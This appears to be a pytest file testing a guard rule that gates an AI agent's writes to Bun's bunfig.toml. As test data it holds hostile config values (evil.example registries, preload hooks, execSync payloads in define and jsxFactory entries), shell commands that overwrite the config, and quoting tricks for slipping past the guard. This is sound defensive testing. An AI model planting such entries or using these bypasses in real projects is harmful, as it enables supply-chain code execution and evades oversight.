"""Bun bunfig.toml exec / package-source hijack guard.

Bun reads `bunfig.toml` (project) and `~/.bunfig.toml` (global) with no
prompt on every `bun run`/`bun test`/`bun install`. `preload`, `[test]
preload`, plugins, the install security scanner, `[run] shell`, and registry
/ TLS-root swaps run attacker code or change where packages come from. The
content check parses the TOML and diffs gated entries before/after.
"""
import pytest

from aegis.engine import evaluate
from aegis.events import ActionClass, Event, HookEvent
from aegis.policy import Action, Policy
from aegis import patterns
from aegis.loader import load_policy
from aegis.rules import rule_bunfig_exec_protect

EMPTY = Policy()
RULE = "bunfig-exec-protect"


def _write(path, content, cwd=None):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Write",
                      args={"file_path": path, "content": content}, cwd=cwd)


def _edit(path, old, new, cwd=None):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Edit",
                      args={"file_path": path, "old_string": old, "new_string": new}, cwd=cwd)


def _shell(cmd):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Bash", args={"command": cmd})


def _mcp(args, tool="mcp__filesystem__write_file"):
    return Event.make(HookEvent.PRE_TOOL_USE, tool=tool, action=ActionClass.MCP, args=args)


def _ours(d):
    return d is not None and d.action == Action.ASK and d.rule == RULE


@pytest.fixture(autouse=True)
def _no_env_escape(monkeypatch):
    monkeypatch.delenv("AEGIS_ALLOW_BUNFIG_EXEC", raising=False)
    monkeypatch.delenv("AEGIS_AGENT_NAME", raising=False)


# ---- paths -------------------------------------------------------------------
@pytest.mark.parametrize("p", [
    "bunfig.toml", "/r/bunfig.toml", "~/.bunfig.toml", "/home/u/.bunfig.toml",
    "$XDG_CONFIG_HOME/.bunfig.toml", "C:\\Users\\u\\.bunfig.toml", "BUNFIG.TOML",
    "/r/bunfig.toml::$DATA", "/r/bunfig.toml. ", "/r/x/../bunfig.toml",
    "file:///r/bunfig%2Etoml",
])
def test_paths_recognized(p):
    assert patterns.bunfig_kind(p) == "toml"


@pytest.mark.parametrize("p", [
    "/r/bunfig.toml.bak", "/r/mybunfig.toml", "/r/bunfig.json", "/r/bunfig.toml/x",
    "/r/pyproject.toml", "/r/bun.lockb",
])
def test_paths_not_recognized(p):
    assert patterns.bunfig_kind(p) == ""


# ---- content: gated entries ---------------------------------------------------
@pytest.mark.parametrize("body", [
    'preload = ["./setup.ts"]',
    'preload = "./x.js"',
    '[test]\npreload = ["./happydom.ts"]',
    '[serve.static]\nplugins = ["bun-plugin-tailwind"]',
    '[install]\nregistry = "https://evil.example/"',
    '[install]\nregistry = { url = "https://registry.npmjs.org/", tls = "x" }',
    '[install.scopes]\nmyorg = "https://evil.example/"',
    '[install]\ncafile = "/tmp/ca.pem"',
    '[install]\nca = "-----BEGIN CERTIFICATE-----"',
    '[install]\nglobalBinDir = "/usr/local/bin"',
    '[install]\nglobalDir = "/tmp/g"',
    '[install.cache]\ndir = "/tmp/poison"',
    '[install]\nauto = "force"',
    '[install]\nignoreScripts = "no"',
    '[install.security]\nscanner = "@evil/scanner"',
    '[run]\nshell = "/tmp/sh"',
    '[debug]\neditor = "/tmp/x"',
    '[define]\n"process.env.X" = "require(\'child_process\').execSync(\'id\')"',
    '[loader]\n".txt" = "js"',
    'jsxImportSource = "./evil"',
    'somethingNew = true',
    '[test]\nnewKey = 1',
    'preload = [',               # unparseable fails closed
])
def test_gated_content(body):
    assert _ours(rule_bunfig_exec_protect(_write("/r/bunfig.toml", body), EMPTY))


@pytest.mark.parametrize("body", [
    "",
    'jsx = "react"\njsxFactory = "h"\nsmol = true\nlogLevel = "debug"\ntelemetry = false',
    '[test]\ncoverage = true\ncoverageThreshold = 0.9\nroot = "./src"\ntimeout = 5000',
    '[test.reporter]\njunit = "out.xml"',
    '[install]\nexact = true\noptional = false\nfrozenLockfile = true\nlinker = "isolated"',
    '[install]\nregistry = "https://registry.npmjs.org/"',
    '[install.lockfile]\nsave = true',
    '[install.cache]\ndisable = true',
    '[install]\nauto = "fallback"\nignoreScripts = true',
    '[run]\nshell = "system"\nbun = true\nsilent = true',
    '[define]\n"process.env.NODE_ENV" = "\\"production\\""\n"DEBUG" = "false"',
    '[loader]\n".svg" = "text"\n".mjs" = "js"',
    'jsxImportSource = "@emotion/react"',
    'env = false',
    '[console]\ndepth = 4',
])
def test_routine_content_allowed(body):
    assert rule_bunfig_exec_protect(_write("/r/bunfig.toml", body), EMPTY) is None


def test_global_file_gated():
    assert _ours(rule_bunfig_exec_protect(_write("/home/u/.bunfig.toml", 'preload="/tmp/x.js"'), EMPTY))


def test_non_bunfig_ignored():
    assert rule_bunfig_exec_protect(_write("/r/other.toml", 'preload="x"'), EMPTY) is None


# ---- edits are replayed and diffed ------------------------------------------
def test_edit_uncomment_counts(tmp_path):
    f = tmp_path / "bunfig.toml"
    f.write_text('[test]\ncoverage = true\n# preload = ["./x.ts"]\n')
    d = rule_bunfig_exec_protect(_edit(str(f), '# preload', 'preload'), EMPTY)
    assert _ours(d)


def test_edit_beside_human_preload_allowed(tmp_path):
    f = tmp_path / "bunfig.toml"
    f.write_text('preload = ["./setup.ts"]\n[test]\ncoverage = false\n')
    assert rule_bunfig_exec_protect(_edit(str(f), 'coverage = false', 'coverage = true'), EMPTY) is None


def test_edit_extending_preload_gated(tmp_path):
    f = tmp_path / "bunfig.toml"
    f.write_text('preload = ["./setup.ts"]\n')
    d = rule_bunfig_exec_protect(_edit(str(f), '"./setup.ts"', '"./setup.ts", "/tmp/x.js"'), EMPTY)
    assert _ours(d)


def test_edit_unverifiable_gated(tmp_path):
    f = tmp_path / "bunfig.toml"
    f.write_text('[test]\ncoverage = true\n')
    assert _ours(rule_bunfig_exec_protect(_edit(str(f), 'not there', 'x'), EMPTY))


def test_edit_missing_file_gated(tmp_path):
    assert _ours(rule_bunfig_exec_protect(_edit(str(tmp_path / "bunfig.toml"), 'a', 'b'), EMPTY))


def test_multiedit(tmp_path):
    f = tmp_path / "bunfig.toml"
    f.write_text('[install]\nexact = true\n')
    ev = Event.make(HookEvent.PRE_TOOL_USE, tool="MultiEdit", args={
        "file_path": str(f), "edits": [
            {"old_string": "exact = true", "new_string": "exact = true\nregistry = \"https://e.x/\""}]})
    assert _ours(rule_bunfig_exec_protect(ev, EMPTY))


# ---- MCP ------------------------------------------------------------------------
def test_mcp_write():
    assert _ours(rule_bunfig_exec_protect(_mcp({"path": "/r/bunfig.toml", "content": 'preload="x"'}), EMPTY))


def test_mcp_write_routine():
    assert rule_bunfig_exec_protect(_mcp({"path": "/r/bunfig.toml", "content": "smol = true"}), EMPTY) is None


def test_mcp_odd_key():
    assert _ours(rule_bunfig_exec_protect(_mcp({"target": "./bunfig.toml", "data": 'preload="x"'}), EMPTY))


def test_mcp_dir_name_shape():
    assert _ours(rule_bunfig_exec_protect(
        _mcp({"directory": "/r", "filename": "bunfig.toml", "content": 'preload="x"'}), EMPTY))


def test_mcp_move_into():
    ev = _mcp({"source": "/tmp/x", "destination": "/r/bunfig.toml"}, tool="mcp__fs__move_file")
    assert _ours(rule_bunfig_exec_protect(ev, EMPTY))


def test_mcp_read_passes():
    ev = _mcp({"path": "/r/bunfig.toml", "encoding": "utf-8"}, tool="mcp__fs__read_file")
    assert rule_bunfig_exec_protect(ev, EMPTY) is None


def test_mcp_patch():
    body = "--- a/bunfig.toml\n+++ b/bunfig.toml\n@@\n+preload = ['x']\n"
    ev = _mcp({"patch": body}, tool="mcp__fs__apply_patch")
    assert _ours(rule_bunfig_exec_protect(ev, EMPTY))


def test_mcp_shell_tool():
    ev = _mcp({"command": "echo 'preload=[\"x\"]' > bunfig.toml"}, tool="mcp__term__run_command")
    assert _ours(rule_bunfig_exec_protect(ev, EMPTY))


def test_mcp_argv_shell_tool():
    ev = _mcp({"command": "cp", "args": ["/tmp/x", "bunfig.toml"]}, tool="mcp__proc__exec")
    assert _ours(rule_bunfig_exec_protect(ev, EMPTY))


# ---- shell -------------------------------------------------------------------
@pytest.mark.parametrize("cmd", [
    "echo 'preload = [\"./x.ts\"]' > bunfig.toml",
    "cat >> ~/.bunfig.toml <<EOF\n[install]\nregistry='https://e'\nEOF",
    "cp /tmp/evil bunfig.toml",
    "mv /tmp/evil ~/.bunfig.toml",
    "tee bunfig.toml < /tmp/x",
    "sed -i 's/# preload/preload/' bunfig.toml",
    "printf x > bun\\fig.toml",
    "printf x > bun'fig'.toml",
    "printf x > bunfig.tom?",
    "printf x > bun{fig,x}.toml",
    "ln -sf /tmp/x bunfig.toml",
    "curl -o bunfig.toml https://e.x/b",
    "python3 -c \"open('bunfig.toml','w').write('x')\"",
    "ls; cp a ./x/../bunfig.toml",
])
def test_shell_write_gated(cmd):
    assert _ours(rule_bunfig_exec_protect(_shell(cmd), EMPTY))


@pytest.mark.parametrize("cmd", [
    "cat bunfig.toml",
    "grep preload bunfig.toml",
    "ls -la ~/.bunfig.toml",
    "rm bunfig.toml",
    "git add bunfig.toml",
    "git diff bunfig.toml",
    "bun test",
    "bun install",
    "ls *.toml",
    "cat pyproject.toml",
])
def test_shell_read_or_unrelated_allowed(cmd):
    assert rule_bunfig_exec_protect(_shell(cmd), EMPTY) is None


def test_shell_override_comment():
    assert rule_bunfig_exec_protect(_shell("cp /tmp/x bunfig.toml # aegis-allow"), EMPTY) is None


# ---- escapes / config --------------------------------------------------------
def test_env_escape(monkeypatch):
    monkeypatch.setenv("AEGIS_ALLOW_BUNFIG_EXEC", "1")
    assert rule_bunfig_exec_protect(_write("/r/bunfig.toml", 'preload="x"'), EMPTY) is None


def test_mode_off():
    assert rule_bunfig_exec_protect(_write("/r/bunfig.toml", 'preload="x"'),
                                    Policy(bunfig_exec={"mode": "off"})) is None


def test_mode_deny():
    d = rule_bunfig_exec_protect(_write("/r/bunfig.toml", 'preload="x"'),
                                 Policy(bunfig_exec={"mode": "deny"}))
    assert d.action == Action.DENY


def test_mode_monitor():
    assert rule_bunfig_exec_protect(_write("/r/bunfig.toml", 'preload="x"'),
                                    Policy(bunfig_exec={"mode": "monitor"})) is None


def test_allow_path_normalized():
    pol = Policy(bunfig_exec={"allow": ["^/ci/repo/bunfig\\.toml$"]})
    assert rule_bunfig_exec_protect(_write("/ci/repo/bunfig.toml", 'preload="x"'), pol) is None
    assert _ours(rule_bunfig_exec_protect(_write("/ci/repo/x/../../evil/bunfig.toml", 'preload="x"'), pol))


def test_allow_shell_fullmatch():
    pol = Policy(bunfig_exec={"allow": ["cp /ci/bunfig.toml bunfig.toml"]})
    assert rule_bunfig_exec_protect(_shell("cp /ci/bunfig.toml bunfig.toml"), pol) is None
    assert _ours(rule_bunfig_exec_protect(_shell("cp /ci/bunfig.toml bunfig.toml; cp /tmp/x bunfig.toml"), pol))


def test_loader_reads_policy_key(tmp_path):
    f = tmp_path / "p.yaml"
    f.write_text("bunfig_exec:\n  mode: deny\n")
    assert load_policy(str(f)).bunfig_exec == {"mode": "deny"}


# ---- engine wiring -----------------------------------------------------------
def test_engine_asks_on_preload():
    d = evaluate(_write("/r/bunfig.toml", 'preload = ["./x.ts"]'), EMPTY)
    assert d.action in (Action.ASK, Action.DENY)


def test_engine_allows_routine():
    d = evaluate(_write("/r/bunfig.toml", "[test]\ncoverage = true\n"), EMPTY)
    assert d.action == Action.ALLOW


def test_non_dict_args_judged():
    ev = Event.make(HookEvent.PRE_TOOL_USE, tool="Bash", args="cp /tmp/x bunfig.toml")
    assert _ours(rule_bunfig_exec_protect(ev, EMPTY))


# ---- QA round 1 (design review) ---------------------------------------------
@pytest.mark.parametrize("body", [
    '[define]\n"process.env.bagel" = "\'lox\'"\n"x" = "undefined"',
    '[install]\nregistry = { url = "https://registry.npmjs.org/", token = "$NPM_TOKEN" }',
    '[install.scopes]\nmyorg = { url = "https://registry.npmjs.org/", token = "$NPM_TOKEN" }',
    '[install]\nignoreScripts = false',
    'jsxFactory = "React.createElement"\njsxFragment = "Fragment"',
    '[test]\nconcurrent = true\nmaxConcurrency = 4',
])
def test_qa1_routine_allowed(body):
    assert rule_bunfig_exec_protect(_write("/r/bunfig.toml", body), EMPTY) is None


@pytest.mark.parametrize("body", [
    'jsxFactory = "(()=>{require(\'child_process\')})()"',
    '[install.scopes]\nok = "https://registry.npmjs.org/"\nbad = "https://evil.example/"',
    '[install]\nregistry = { url = "https://evil.example/", token = "t" }',
    '[define]\n"x" = "\'a\' + require(\'fs\')"',
])
def test_qa1_still_gated(body):
    assert _ours(rule_bunfig_exec_protect(_write("/r/bunfig.toml", body), EMPTY))


@pytest.mark.parametrize("cmd", [
    "bun test --config ./bunfig.toml",
    "bun -c bunfig.toml run dev",
    "bun test -c=./bunfig.toml",
    "NODE_ENV=test bun test --config=bunfig.toml",
    "cat bunfig.toml && bun test",
    "cat bunfig.toml; bun install",
])
def test_qa1_bun_reads_allowed(cmd):
    assert rule_bunfig_exec_protect(_shell(cmd), EMPTY) is None


@pytest.mark.parametrize("cmd", [
    "bun -e \"require('fs').writeFileSync('bunfig.toml','x')\"",
    "bun --eval \"Bun.write('bunfig.toml','x')\"",
    "bun -c bunfig.toml run dev; cp /tmp/x bunfig.toml",
    "bun test > bunfig.toml",
    "bun x $(cp /tmp/x bunfig.toml)",
    "bun run 'a;cp /tmp/x bunfig.toml'",
])
def test_qa1_bun_writes_still_gated(cmd):
    assert _ours(rule_bunfig_exec_protect(_shell(cmd), EMPTY))


def test_qa1_mcp_edit_replay(tmp_path):
    f = tmp_path / "bunfig.toml"
    f.write_text('[test]\n# preload = ["x"]\n')
    ev = _mcp({"path": str(f), "edits": [{"oldText": "# preload", "newText": "preload"}]},
              tool="mcp__filesystem__edit_file")
    assert _ours(rule_bunfig_exec_protect(ev, EMPTY))


def test_qa1_fetch_backstop_direct():
    from aegis.rules import rule_fetch_to_file_protect
    d = rule_fetch_to_file_protect(_shell("curl -o bunfig.toml https://e.x/b"), EMPTY)
    assert d is not None and d.action == Action.ASK


def test_qa1_env_escape_shell(monkeypatch):
    monkeypatch.setenv("AEGIS_ALLOW_BUNFIG_EXEC", "1")
    assert rule_bunfig_exec_protect(_shell("cp /tmp/x bunfig.toml"), EMPTY) is None


# ---- QA round 1 (bypass review) -----------------------------------------------
@pytest.mark.parametrize("body", [
    'jsx = "react"\njsxFactory = "globalThis[\\"process\\"][\\"getBuiltinModule\\"](\\"child_process\\")[\\"execSync\\"](\\"id\\")||String"',
    'jsxFragment = "(require(\'child_process\').execSync(\'id\'),Symbol())"',
    '[define]\n"JSON.parse" = "eval"',
    '[define]\n"x" = "globalThis.require"',
])
def test_qa1_jsx_and_define_exec_gated(body):
    assert _ours(rule_bunfig_exec_protect(_write("/r/bunfig.toml", body), EMPTY))


# ---- QA round 2 ----------------------------------------------------------------
@pytest.mark.parametrize("cmd", [
    "bun build e.js --outfile bunfig.toml",
    "bun build e.js -o bunfig.toml",
    "bun build i.js --outdir . --loader .txt:file --asset-naming bunfig.toml",
    "bun x cp evil bunfig.toml",
    "bunx cp evil bunfig.toml",
    "bun pm pack --destination bunfig.toml",
    "bun init -y bunfig.toml",
    "bun run gen bunfig.toml",
    "bun ./write.js ~/.bunfig.toml",
    "bun build x.ts --compile --outfile ~/.bunfig.toml",
    "cat bunfig.toml && bun build e.js --outfile bunfig.toml",
    "bun test -c bunfig.toml && bun x cp evil bunfig.toml",
    "bun build e.js -c bunfig.toml --outfile bunfig.toml",
])
def test_qa2_bun_writers_gated(cmd):
    assert _ours(rule_bunfig_exec_protect(_shell(cmd), EMPTY))


@pytest.mark.parametrize("body", [
    '[test.reporter]\njunit = "/home/u/.bashrc"',
    '[test.reporter]\njunit = "../../.git/hooks/pre-commit"',
    '[test.reporter]\njunit = "~/.profile"',
    '[test]\ncoverageDir = "/etc/x"',
])
def test_qa2_output_paths_outside_gated(body):
    assert _ours(rule_bunfig_exec_protect(_write("/r/bunfig.toml", body), EMPTY))


@pytest.mark.parametrize("body", [
    '[test.reporter]\njunit = "reports/junit.xml"',
    '[test]\ncoverageDir = "coverage"',
])
def test_qa2_output_paths_local_allowed(body):
    assert rule_bunfig_exec_protect(_write("/r/bunfig.toml", body), EMPTY) is None


# ---- QA round 3 ----------------------------------------------------------------
@pytest.mark.parametrize("cmd", [
    "bun x install src.toml -c bunfig.toml",
    "bunx install src.toml -c bunfig.toml",
    "bun x install src.toml --config bunfig.toml",
    "bun x rsync src.toml -c bunfig.toml",
    "bun run gen -c bunfig.toml",
    "bun ./write.js --config=bunfig.toml",
    "bunx -c bunfig.toml",
])
def test_qa3_forwarded_config_gated(cmd):
    assert _ours(rule_bunfig_exec_protect(_shell(cmd), EMPTY))


@pytest.mark.parametrize("cmd", [
    "bun -c bunfig.toml run dev",
    "bun --config=./bunfig.toml test",
    "bun install -c bunfig.toml",
    "bun test --watch -c ./bunfig.toml",
])
def test_qa3_own_config_reads_allowed(cmd):
    assert rule_bunfig_exec_protect(_shell(cmd), EMPTY) is None
